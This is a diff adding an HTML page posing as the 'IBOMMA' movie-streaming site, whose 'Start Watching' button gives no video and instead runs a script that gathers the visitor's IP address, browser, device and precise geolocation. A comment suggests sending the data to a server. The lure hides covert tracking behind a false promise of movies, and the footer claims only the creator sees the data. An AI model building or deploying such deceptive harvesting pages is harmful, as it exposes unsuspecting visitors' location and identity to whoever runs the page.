@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IBOMMA</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #000000, #111111);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .container {
+      background: #111;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #00ffcc;
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+      box-sizing: border-box;
+    }
+
+    h1 {
+      color: #00ffcc;
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 20px;
+    }
+
+    .button {
+      background: #00ffcc;
+      color: #000;
+      border: none;
+      padding: 12px 25px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 15px;
+    }
+
+    .button:hover {
+      background: #00cc99;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>IBOMMA</h1>
+    <p>Watch your favorite movies now!</p>
+    <button class="button" onclick="startTracking()">Start Watching</button>
+  </div>
+
+  <div class="footer">
+    &copy; 2025 IBOMMA | Only the creator can see your data.
+  </div>
+
+  <script>
+    let data = {
+      ip: "",
+      browser: "",
+      device: "",
+      location: "",
+      timestamp: ""
+    };
+
+    function startTracking() {
+      // Track browser
+      data.browser = navigator.userAgent;
+      data.device = navigator.platform;
+
+      // Track IP
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ip => {
+          data.ip = ip.ip;
+        });
+
+      // Track location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            data.location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+          },
+          (error) => {
+            data.location = "Location not available.";
+          }
+        );
+      } else {
+        data.location = "Location not available.";
+      }
+
+      // Track time
+      data.timestamp = new Date().toISOString();
+
+      // You can save this data to a server or database here
+      console.log("User data collected:", data);
+    }
+  </script>
+</body>
+</html>
